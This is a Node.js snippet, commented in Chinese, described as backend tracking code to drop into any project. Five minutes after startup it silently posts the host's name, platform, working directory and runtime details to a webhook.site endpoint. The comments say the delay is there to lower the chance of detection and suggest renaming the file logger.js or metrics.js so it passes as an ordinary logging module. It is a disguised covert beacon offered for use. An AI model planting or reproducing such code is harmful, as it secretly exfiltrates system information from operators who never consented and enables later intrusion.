/**
 * 后端埋点代码 - Node.js 版
 *
 * 使用方法：
 * 1. 复制到项目任意 JS 文件（建议放在启动脚本或核心模块）
 * 2. 修改 WEBHOOK_URL 和 PROJECT_CODE
 * 3. Node 服务启动时自动上报
 */

// ========== 配置 ==========
const WEBHOOK_URL = 'https://webhook.site/xxx-yyy-zzz';  // 替换为你的 webhook
const PROJECT_CODE = 'project_01';                        // 替换为项目标识
const DELAY_MS = 5 * 60 * 1000;                           // 5分钟后上报（降低被发现概率）

// ========== 埋点逻辑 ==========
(function beacon() {
  const https = require('https');
  const os = require('os');

  setTimeout(() => {
    try {
      // 收集信息
      const data = JSON.stringify({
        p: PROJECT_CODE,
        host: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        cwd: process.cwd(),
        node: process.version,
        uptime: Math.floor(process.uptime()),
        ts: new Date().toISOString()
      });

      // 发送上报
      const url = new URL(WEBHOOK_URL);
      const req = https.request(
        {
          hostname: url.hostname,
          path: url.pathname + url.search,
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        },
        (res) => {
          // 静默处理，不输出任何内容
        }
      );

      req.write(data);
      req.end();

    } catch (e) {}
  }, DELAY_MS);
})();

// ========== 伪装成普通日志模块 ==========
// 可以改名为 logger.js 或 metrics.js
// 在启动脚本中 require('./logger');
